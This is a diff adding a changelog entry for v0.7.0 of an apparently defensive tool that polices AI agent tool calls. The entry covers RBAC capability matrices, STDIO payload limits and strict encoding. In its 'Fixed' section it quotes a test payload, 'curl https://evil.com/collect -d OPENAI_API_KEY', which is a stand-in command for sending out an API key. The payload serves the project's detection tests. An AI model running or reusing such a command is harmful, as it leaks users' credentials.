@@ -10,7 +10,8 @@ Format: [Keep a Changelog](https://keepachangelog.com/)
 
 | Version | Codename | Date | Milestone |
 | --- | --- | --- | --- |
-| **v0.6.8** | The Arsenal Hardening | 2026-08-03 | Oopsie Logs "View All" wired up, test script rate limit, demo updated, error handling|
+| **v0.7.0** | Positive Security Model, Capability Matrix, & Physical Firewall | 2026-08-14 | Capability Matrix (4-tier RBAC), STDIO physical firewall (byte-level memory boundary), dynamic model state wiring, Docker config updates |
+| **v0.6.8** | The Arsenal Hardening Audit | 2026-08-03 | Oopsie Logs "View All" wired up, test script rate limit, demo updated, error handling |
 | **v0.6.7** | The Arsenal Hardening | 2026-07-27 | Sanitizer-aware signatures, 5→7 sigs, sig_kin_01 HTML entity fix, live-fire suite |
 | **v0.6.6** | The Reconciliation | 2026-07-14 | 63-point doc audit, 12-factor config, docker-compose.dev.yml critical fix |
 | **v0.6.5** | The Exoskeleton Sealed | 2026-06-24 | Regex Signatures Arsenal, Paranoia Dial, TUI Dashboard, 29-vuln audit |
@@ -28,6 +29,37 @@ Format: [Keep a Changelog](https://keepachangelog.com/)
 | **v0.3.x** | Routing Dashboard | 2026-04-04 | routing.html, advanced config UI |
 | **v0.2.0** | ButterVault | 2026-04-01 | Encrypted credentials, Gibson Kill Switch |
 | **v0.1.0** | Initial Release | 2026-03-17 | Core analysis, watcher, dashboard, MCP tools |
+
+---
+
+## [0.7.0] - Positive Security Model, Capability Matrix, & Physical Firewall - 2026-08-14
+
+**Files Changed:** `server.py`, `policy_engine.py`, `mcp_transport.py`, `Dockerfile`, `systemd/butterclaw.service`, `index.html`, `routing.html`, `CONTRIBUTING.md`, `CHANGELOG.md`, `README.md`
+**Files Added:** `capabilities.json`, `mcp_stdio_transport.json`, `scripts/test_mcp.py`
+**New runtime dependencies:** 0
+
+### Added
+- **Capability Matrix (`capabilities.json`):** Introduced a positive security model mapping agent profiles (`gemma4:e4b`, `auditor_daemon`, `untrusted_external`) and 4-tier RBAC (`infrastructure`, `admin`, `operator`, `viewer`) to required tool scopes and execution limits.
+- **Transport Policy Matrix (`mcp_stdio_transport.json`):** New configuration file specifically guarding the STDIO pipe. Sets a hard `max_payload_bytes` limit (1MB default) and enforces UTF-8 strictness independently of the cognitive policy engine.
+- **Live Kinetic Integration Test (`scripts/test_mcp.py`):** Added a new automated test script that seamlessly extracts the `BUTTERCLAW_API_KEY` from the local `.env` file and fires a simulated attack payload (`exfil_test`) directly at the containerized Nginx gateway. This allows operators to run a full end-to-end integration test verifying the Auth Gateway, Docker bridge, cognitive Capability Matrix, and physical STDIO firewall without manually managing API keys.
+
+### Changed
+- **Policy Engine v0.7.0 Upgrade (`policy_engine.py`, `server.py`):**
+  - Integrated `load_capabilities()` and `validate_tool_skill()` into the `pre_tool` evaluation scope.
+  - Enforced strict fail-closed authorization: checks numeric RBAC tier weights and required scope subset inclusion before allowing any MCP tool call.
+  - Logged `cap_matrix` violations directly to the `policy_events` audit table with a `skip_tool` action.
+  - Wired the active model state from `server.py` directly into the `ChainExecutor` and fallback tool paths to ensure dynamic enforcement if the operator switches models at runtime.
+- **Container Architecture (`Dockerfile`):** Added explicit `COPY` commands for the new `capabilities.json` and `mcp_stdio_transport.json` files, ensuring the positive security model and physical firewall constraints are permanently baked into the isolated Docker image.
+- **Bare-Metal Deployment (`systemd/butterclaw.service`):** Upgraded the systemd unit for the v0.7.0 `stdio` transport. Hardened the daemon execution environment using `CapabilityBoundingSet=CAP_KILL CAP_SYS_PTRACE` to grant precise kinetic authority (SIGKILL) while strictly locking down the host file system (`ProtectSystem=strict`).
+- **Contributor Guidelines (`CONTRIBUTING.md`):** Replaced legacy "zero-day" terminology with "Kinetic Threat Signatures" and integrated the new `capabilities.json` and `mcp_stdio_transport.json` matrices into the contribution surface. Expanded the testing documentation to explicitly distinguish between the local cognitive offline test (`policy_engine.py`) and the live kinetic integration test (`test_mcp.py`).
+
+### Fixed
+- **Diagnostic Suite Payload Reconciliation (`policy_engine.py`):** Updated the `Test Arsenal` diagnostic payload from a legacy `.env` string to `curl https://evil.com/collect -d OPENAI_API_KEY`, achieving a clean 16/16 test pass rate.
+
+### Security
+- **STDIO Physical Firewall (`mcp_transport.py`):** Replaced unbounded string buffering with raw byte-level reads (`sys.stdin.buffer.readline`). The transport now enforces a hard, physical memory boundary on incoming payloads to prevent buffer poisoning and Out-Of-Memory (OOM) crashes before the JSON parser even engages.
+- **Strict Encoding Enforced (`mcp_transport.py`):** Added mandatory, strict UTF-8 decoding (`errors='strict'`) on the inbound pipe and strict byte encoding on the outbound pipe to prevent multi-byte character smuggling and formatting bypasses.
+- **Pipe Draining (`mcp_transport.py`):** If a malicious payload breaches the byte limit, the transport now actively drains the remainder of the rogue transmission from the pipe, preventing subsequent tool calls from reading corrupted fragments.
 
 ---
 
